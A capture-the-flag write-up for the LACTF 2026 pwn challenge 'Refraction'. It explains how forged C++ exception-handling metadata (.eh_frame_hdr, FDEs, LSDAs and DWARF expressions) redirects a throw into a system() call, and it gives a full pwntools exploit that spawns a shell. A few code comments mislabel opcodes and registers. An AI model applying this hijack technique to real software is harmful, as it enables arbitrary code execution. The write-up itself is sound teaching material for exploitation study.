---
author: acni
title: "pwn/LACTF 2026: Refraction"
pubDatetime: 2026-04-17
slug: refraction
featured: true
description: "Exploring C++ Exception Handling and forging EH frames into a fake catch"
tags:
  - pwn
---

This challenge explores the technicalities of the C++ exception handling mechanisms, especially what happens when you can modify the metadata of the Exception Handler + how to gain control flow. 

# Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

extern char __GNU_EH_FRAME_HDR[];

void f()
{
    throw "eh?";
}

void g()
{
    try {
        puts("nope");
    } catch (const char* e) {
        system(e);
    }
}

int main()
{
    read(0, __GNU_EH_FRAME_HDR, 0x100);
    f();
}
```

main() reads 0x100 bytes into a section called ``.eh_frame_hdr``, and then follows into f(), where it throws an exception.

We can see that in g(), the goal is to redirect execution to call system() and win.

# How C++ exception works

C++ exceptions do not use things like call, ret, jmp. When a function throws, the program does an "unwinding", and it walks back stack frames looking for a handler that can catch the thrown object. Then, after each frame, the ``unwinder`` needs to recover the caller's register state and move to the previous frame, and determine if the current frame can handle the exception, and then determine where execution should continue. 

To do this, it utilizes exception metadata that is stored in the binary. 
| &nbsp; | &nbsp; |
| --- | --- |
| `.eh_frame_hdr` | Lookup table the unwinder uses to find the right FDE for a program counter. |
| `.eh_frame` | Main unwind section that stores the CIE and FDEs. |
| `CIE` | Basic template that defines the general unwind rules. |
| `FDE` | Tells the runtime how to move from the current frame to the previous one. |
| `personality routine` | Runtime function that reads a frame's exception metadata and decides whether that frame handles the exception. |
| `LSDA` | Tells the personality routine whether a frame catches the exception and where to jump. |

Basically, the unwinder walks frame by frame, reading the ``FDE`` and ``LSDA``. Then, the ``personality routine`` checks if the frame has a working handler. Once a matching frame is found, the program reconstructs the register states and transfers control flow there. 

In our program, main() allows attacker-controlled input to overwrite ``.eh_frame_hdr`` (and eh frame) before the throw happens. Since the runtime trusts this metadata during unwinding, forging it lets us change how the unwinder reconstructs the next frame and where it believes a valid handler exists. Therefore, we can make the program think that f() can't handle the exception and should continue unwinding, and then make up a fake frame inside g()'s catch frame so that the program transfers control inside the system(e) code. 

Some FDE fields use DWARF expressions, which are small stack-machine programs embedded in unwind metadata. In this exploit, they are used to compute a fake CFA and fake saved register values for the fake frame.

https://dwarfstd.org/doc/DWARF5.pdf Page 28 (2.5.1.2 Register Values) shows many of the operations used in this exploit and that are available. 

So, this exploit will only require one payload, and it will make it jump to system(e) and will pop a shell. 

``__GNU_EH_FRAME_HDR`` points to the start of ``.eh_frame_hdr``, which is then followed by ``.eh_frame``, which stores all of the actual CIEs and FDEs. Since we can write 0x100 bytes after ``__GNU_EH_FRAME_HDR`` we can also modify ``.eh_frame``.

# Changing the .eh_frame_hdr 

```py
header = bytearray()
header += b"\x01"  # version = 1
header += b"\x1b"  # .eh_frame pointer encoding = pcrel | sdata4
header += b"\x03"  # FDE-count encoding = udata4
header += b"\x3b"  # table encoding = datarel | sdata4
header += s32(frame - (hdr + 4))  # pcrel pointer to the forged .eh_frame area at 0x38
header += p32(2)  # there are exactly two search-table entries

header += s32(f - hdr)  # entry 0 key: PC for f()
header += s32(search_fde_addr - hdr)  # entry 0 value: search FDE for f()
header += s32(fake_frame - hdr)  # entry 1 key: synthetic frame at g()+0x28
header += s32(handler_fde_addr - hdr)  # entry 1 value: handler FDE for the synthetic frame
header = header.ljust(0x34, b"\x00")
```

The ``.eh_frame_hdr`` is the unwinder’s lookup table. It tells the runtime where ``.eh_frame`` is, tells the program how many FDE entries exist, and gives a searchable binary mapping from addresses to the FDE that describes how to unwind that code.

In this exploit, the forged header maps f() to our fake search FDE and g()+0x28 to our fake handler FDE. 

```
We use g()+0x28 because this is where the catch handler for the catch (const char *) for g() begins in the asm. 
1200:	48 89 c7             	mov    %rax,%rdi
1203:	e8 28 fe ff ff       	call   1030 <__cxa_begin_catch@plt>
1208:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
120c:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
1210:	48 89 c7             	mov    %rax,%RDI
```

The first 4 headers are basically just telling the unwinder how to interpret the binary search table: (eh_frame_ptr_enc, fde_count_enc, table_enc, eh_frame_ptr)

Structure of ``.eh_frame_hdr`` = https://refspecs.linuxfoundation.org/LSB_1.3.0/gLSB/gLSB/ehframehdr.html

Then its padded to 0x34 because the real .eh_frame_hdr section in this binary is exactly 0x34 bytes long.


# CIE

 the CIE is mostly a copied template. The main purpose is just to make the forged FDEs look valid and use the same unwinding as the real binary

The forged CIE is copied from the binary’s real C++ unwind metadata. 

```
A Common Information Entry (CIE) is a technical structure found in the .eh_frame section of executable files (DWARF debugging format) that defines how to unwind stack frames for exception handling. It contains data about return addresses and register restoration, usually associated with multiple Frame Description Entries (FDEs) to help debuggers and runtime systems

```

# search-fde

We now begin with the fake FDEs. The ``Search FDE`` is used for f(). The main purpose is to tell the personality routine there is no handler in f() available for the throw. It also forges the caller state, so the next unwind step looks like a frame at g()+0x28.

First, the FDE lies about the ``CFA``. The ``Canonical Frame Address`` is the unwinder’s anchor for a frame. Normally, the CIE says the CFA is something simple like rsp + 8, and saved registers are described relative to that address. Here, instead of using the normal stack-based CFA, the exploit defines the CFA with a custom ``DWARF`` expression.

```py
search_fde += b"\x80\x00"  # DW_OP_breg16 0
search_fde += b"\x11" + cmd_delta_sleb  # DW_OP_consts cmd_delta_sleb
search_fde += b"\x22"  # DW_OP_plus 
```

the CFA for this frame is the address of our command string. We want the fake frame state to be built around the command buffer.

| &nbsp; | &nbsp; |
| --- | --- |
| DW_OP_breg16 0 | push RIP + 0 on DWARF stack (register 16 on amd is RIP) |
| DW_OP_consts | pushes a signed immediate onto the stack, which is the delta from g to cmd buffer |
| DW_OP_plus | pops the top 2 values, adds, and then pushes result |

In all, it sets the frame's CFA to current rip + cmd delta so that save register rules are set to the fake layout. 

```py
# rip
search_fde += b"\x16\x10" + bytes([len(resume_expr)])  # DW_CFA_val_expression for RIP
search_fde += resume_expr  # saved RIP = fake_frame+1
```

| &nbsp; | &nbsp; |
| --- | --- |
| DW_CFA_val_expression |The register's value is the result of this expression (from previous instructions) |

resume_expr does this: new_rip = current_rip + ((fake_frame + 1) - g)

It does +1 because the unwinder's lookup using ip-1 falls inside the current frame range (https://raw.githubusercontent.com/gcc-mirror/gcc/master/libgcc/unwind-dw2-fde.c)

this part tells the unwinder the caller frame’s instruction pointer should be treated as if it were inside g()+0x28.
```py
# RSP
search_fde += b"\x16\x07\x02"  # DW_CFA_val_expression for RSP, length = 2 bytes
search_fde += b"\x76\x10"  # DW_OP_breg6 16 -> synthetic rsp = rbp + 16
```

This makes RSP for the next frame equal to rbp + 16. This is because the next frame needs a believable stack pointer. If the unwinder only faked RIP and not RSP, the synthetic frame at g()+0x28 would likely have a garbage stack state and crash as soon as the real catch path tried to run. rbp+16 is already the original stack pointer at the end of f(), so it should work. 


In conclusion, this FDE tells the unwinder:

- Use probe LSDA for end of f()
- f() does NOT catch the exception
- Continue unwinding and looking for a handler
- Make caller frame have CFA = command buffer, RIP = g()+0x29, which is the catch handler in g(), and RSP to rbp + 16, which will prevent a garbage stack state & therefore a crash.

# probe fde

This is the probe LSDA for the FDE in f().

This is the exception table for f(), and it says that for this callsite, the throw in f() does not handle the exception.” This probe makes sure that the unwinder does not stop here thinking that this part can handle the thrown error in f(). If it did, then it would stop here and never call the one in g(). 

```py
probe_lsda = bytearray()
probe_lsda += b"\xff"  # no LPStart pointer
probe_lsda += b"\xff"  # no type table
probe_lsda += b"\x01"  # call-site table entries are uleb128
probe_lsda += b"\x04"  # call-site table is 4 bytes long
probe_lsda += b"\x00"  # call-site start = beginning of f()
probe_lsda += bytes([g-f])  # call-site length = whole f()
probe_lsda += b"\x00"  # landing pad = none
probe_lsda += b"\x00"  # action = none
```

Basically just an empty field, so the unwinder will skip f() and go to g(). 

![img1](/images/refraction/img1.png)

# handler fde

Thanks to the header, now that the unwinder believes the next frame is g()+0x28. So now, this FDE's job will be to describe this frame so that the program will accept this frame as a correct handler for the throw in f(). 

```py
handler_fde = bytearray()
handler_fde += p32(0) # length
handler_fde += p32((handler_fde_addr + 4) - cie_addr) # use same CIE as first FDE
handler_fde += s32(fake_frame - (handler_fde_addr + 8)) # start PC
handler_fde += p32(0x200) # PC range
handler_fde += b"\x04"  # augmentation payload length = 4-byte LSDA pointer
handler_fde += s32((hdr + handler_lsda_off) - (handler_fde_addr + len(handler_fde)))
```

The header handles this. This is basically saying if the current frame's PC is g()+0x28 then there is a valid unwind record for this frame, and the exception table is the handle LSDA at 0xc0.

```py
handler_fde += b"\x0c\x06\x10"  # DW_CFA_def_cfa rbp, 16 (CFA = rbp + 16)
handler_fde += b"\x86\x02"  # DW_CFA_offset saved rbp at CFA + 2 * -8 = saved rbp at [rbp]
```

| &nbsp; | &nbsp; |
| --- | --- |
| DW_CFA_def_cfa | Defines CFA |
| DW_CFA_offset | register saved at memory [CFA + offset] |

Afterwards, it still needs to look like a believeable frame layout. This part tells the unwinder to use this frame like a normal function frame with CFA = rbp + 16 and saved rbp at cfa-16. This way, it makes the fake frame look like a normal frame so that the unwinder will accept it as a handler frame for the throw.

# handler lsda 

This builds the handler LSDA, which is the exception table for the fake frame at g()+0x28.

the second FDE makes the fake frame look like a valid frame, but the handler LSDA makes it look like a valid catch (const char *) frame.

```
Important offsets:
g()+0x28: this is where the catch path begins. After the unwind machinery decides this frame handles the exception, execution can enter here.
g()+0x3b: this is the call system@plt instruction. It is the landing pad the handler LSDA points to.
```

The LSDA is built like this:
```py
handler_lsda = bytearray()
handler_lsda += b"\xff"  # no LPStart pointer
handler_lsda += b"\x1b"  # type-table entries are pcrel | sdata4
handler_lsda += b"\x00"  # placeholder for type-table offset
after_header = hdr + handler_lsda_off + len(handler_lsda)
handler_lsda += b"\x01" + bytes([len(callsite)]) + callsite  # call-site table encoding + length + entry
handler_lsda += b"\x01\x00"  # action 1 catches the first type entry, then stops
handler_lsda += s32(typeinfo - (hdr + handler_lsda_off + len(handler_lsda)))  # reused real _ZTIPKc
handler_lsda[2] = (hdr + handler_lsda_off + len(handler_lsda)) - after_header
```

The handler LSDA uses the RTTI(run time type info) object as its only type table entry (``const char * ``). So the fake handler LDSA basically says it claims to catch types of ``const char *``, and it points to a real RTTI object that matches this. That way, the personality routine depicts it as a real type match. 

this tells the personality routine that the fake frame catches the thrown const char * and should transfer control directly to the system(e) path inside g().

![img2](/images/refraction/img2.png)


# flow

1. Execution flow from start to finish

  - main() overwrites unwind metadata
  - f() throws
  - unwinder uses forged header
  - first FDE applies to f()
  - probe LSDA says keep unwinding
  - first FDE forges the next frame
  - second FDE/LSDA describe that fake frame, and say it catches const char *
  - runtime jumps to g()+0x3b, the address of the system@plt call
  - system(command) runs

# solve
```py
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['alacritty', '-e']

def main():
    bin = "./chall"
    elf = ELF(bin)
    r = process([bin])

    s32 = lambda x: pack(x, 32, sign=True)

    hdr = elf.symbols["__GNU_EH_FRAME_HDR"]
    frame = elf.get_section_by_name(".eh_frame").header.sh_addr
    personality_ref = elf.symbols["DW.ref.__gxx_personality_v0"]
    f = elf.symbols["_Z1fv"] # addr of f()
    g = elf.symbols["_Z1gv"] # addr of g()


    # Mostly all copied from the original binary CIE
    cie_off = frame - hdr
    cie_addr = hdr + cie_off
    cie = bytearray()
    cie += p32(0)
    cie += p32(0)
    cie += b"\x01"  
    cie += b"zPLR\x00" 
    cie += b"\x01" 
    cie += b"\x78"  
    cie += b"\x10"  
    cie += b"\x07"  
    cie += b"\x9b"  
    cie += s32(personality_ref - (cie_addr + len(cie))) 
    cie += b"\x1b"  
    cie += b"\x1b"
    cie += b"\x0c\x07\x08"  
    cie += b"\x90\x01"  
    cie += b"\x00\x00" 
    cie[0:4] = p32(len(cie) - 4)


    probe_lsda_off = 0xb0 
    cmd_off = 0xe0 # off. to system
    fake_frame = g + 0x28 
    search_fde_off = cie_off + len(cie) # offset of first FDE in payload
    search_fde_addr = hdr + search_fde_off # runtime address

    # DW_OP_consts 
    cmddelta = b"\x98\x1e"

    # Search FDE
    resume_expr = bytearray()
    resume_expr += b"\x80\x00"  # DW_OP_breg0 0
    resume_expr += b"\x11" + bytes([(fake_frame + 1) - g])  # DW_OP_consts <fake_frame+1-g>
    resume_expr += b"\x22"  # DW_OP_plus

    #search_fde headers
    search_fde = bytearray()
    search_fde += p32(0) # length
    search_fde += p32((search_fde_addr + 4) - cie_addr) # CIE pointer field. distance from CIE pointer to CIE
    search_fde += s32(f - (search_fde_addr + 8)) # start PC field  
    search_fde += p32(g - f) # PC range: how far the code region extends 
    search_fde += b"\x04"  # augmentation payload length
    search_fde += s32((hdr + probe_lsda_off) - (search_fde_addr + len(search_fde)))

    # exploit part
    search_fde += b"\x0f\x06"  # DW_CFA_def_cfa_expression, 6-byte expression follows
    search_fde += b"\x80\x00"  # DW_OP_breg16 0
    search_fde += b"\x11" + cmddelta  # DW_OP_consts <cmd buffer delta>
    search_fde += b"\x22"  # DW_OP_plus -> CFA now points at the command string
    # rip
    search_fde += b"\x16\x10" + bytes([len(resume_expr)])  # DW_CFA_val_expression for register 16 (RIP)
    search_fde += resume_expr  # saved RIP = fake_frame+1
    # RSP
    search_fde += b"\x16\x07\x02"  # DW_CFA_val_expression for RBP, length = 2 bytes
    search_fde += b"\x76\x10"  # DW_OP_breg6 16 -> synthetic rsp = rbp + 16
    search_fde += b"\x00" * ((4 - (len(search_fde) - 4) % 4) % 4)
    search_fde[0:4] = p32(len(search_fde) - 4)

    # Probe LSDA
    probe_lsda = bytearray()
    probe_lsda += b"\xff"  # no LPStart pointer
    probe_lsda += b"\xff"  # no type table
    probe_lsda += b"\x01"  # call-site table entries are uleb128
    probe_lsda += b"\x04"  # call-site table is 4 bytes long
    probe_lsda += b"\x00"  # call-site start = beginning of f()
    probe_lsda += bytes([g-f])  # call-site length = whole f()
    probe_lsda += b"\x00"  # landing pad = none
    probe_lsda += b"\x00"  # action = none


    # Handler FDE
    handler_lsda_off = 0xc0
    handler_fde_off = (search_fde_off + len(search_fde) + 3) & ~3 # aligment
    handler_fde_addr = hdr + handler_fde_off 

    # same structure as search fde
    handler_fde = bytearray()
    handler_fde += p32(0) # length
    handler_fde += p32((handler_fde_addr + 4) - cie_addr) # use same CIE as first FDE
    handler_fde += s32(fake_frame - (handler_fde_addr + 8)) # start PC
    handler_fde += p32(0x200) # PC range
    handler_fde += b"\x04"  
    handler_fde += s32((hdr + handler_lsda_off) - (handler_fde_addr + len(handler_fde)))

    handler_fde += b"\x0c\x06\x10"  # DW_CFA_def_cfa rbp, 16
    handler_fde += b"\x86\x02"  # DW_CFA_offset rbp, 2
    handler_fde += b"\x00" * ((4 - (len(handler_fde) - 4) % 4) % 4) # alignment
    handler_fde[0:4] = p32(len(handler_fde) - 4)

    terminator_off = (handler_fde_off + len(handler_fde) + 3) & ~3 # end marker to do p32(0) (where to put a zero terminator)


    typeinfo = elf.symbols["_ZTIPKc"] # char const *
    system_call = g + 0x3b # absolute address of system@plt
    callsite = bytearray()
    callsite += b"\x00"  # beginning of fake_frame
    callsite += b"\x80\x04"  # call-site length (uleb128(0x200)) 
    callsite += bytes([system_call - fake_frame])  # landing pad offset = g+0x3b - fake_frame
    callsite += b"\x01"  # action record index

    handler_lsda = bytearray()
    handler_lsda += b"\xff"  # no LPStart pointer
    handler_lsda += b"\x1b"  # type-table entries are pcrel | sdata4
    handler_lsda += b"\x00"  # placeholder for type-table offset
    after_header = hdr + handler_lsda_off + len(handler_lsda)
    handler_lsda += b"\x01" + bytes([len(callsite)]) + callsite  # call-site table encoding + length + entry
    handler_lsda += b"\x01\x00"  # action 1 catches the first type entry, then stops
    handler_lsda += s32(typeinfo - (hdr + handler_lsda_off + len(handler_lsda)))  # reused real _ZTIPKc
    handler_lsda[2] = (hdr + handler_lsda_off + len(handler_lsda)) - after_header


    header = bytearray()
    header += b"\x01"  
    header += b"\x1b"  # pcrel | sdata4
    header += b"\x03"  # FDE-count encoding = udata4
    header += b"\x3b"  #  datarel | sdata4
    header += s32(frame - (hdr + 4))  # pcrel pointer to the forged .eh_frame area at 0x38
    header += p32(2)  # two search-table entries
    header += s32(f - hdr)  # entry 0 key: PC for f()
    header += s32(search_fde_addr - hdr)  # entry 0 value: search FDE for f()
    header += s32(fake_frame - hdr)  # entry 1 key: synthetic frame at g()+0x28
    header += s32(handler_fde_addr - hdr)  # entry 1 value: handler FDE for the synthetic frame
    header = header.ljust(0x34, b"\x00")

    
    payload = bytes(header)
    payload = payload.ljust(cie_off, b"\x00") + bytes(cie)
    payload = payload.ljust(search_fde_off, b"\x00") + bytes(search_fde)
    payload = payload.ljust(handler_fde_off, b"\x00") + bytes(handler_fde)
    payload = payload.ljust(terminator_off, b"\x00") + p32(0)
    payload = payload.ljust(probe_lsda_off, b"\x00") + bytes(probe_lsda)
    payload = payload.ljust(handler_lsda_off, b"\x00") + bytes(handler_lsda)
    payload = payload.ljust(cmd_off, b"\x00")

    command = ("/bin/sh").encode()
    payload += command[: 0x100 - cmd_off]
    payload = payload.ljust(0x100, b"\x00")

    r.send(bytes(payload))
    r.interactive()


if __name__ == "__main__":
    main()
```
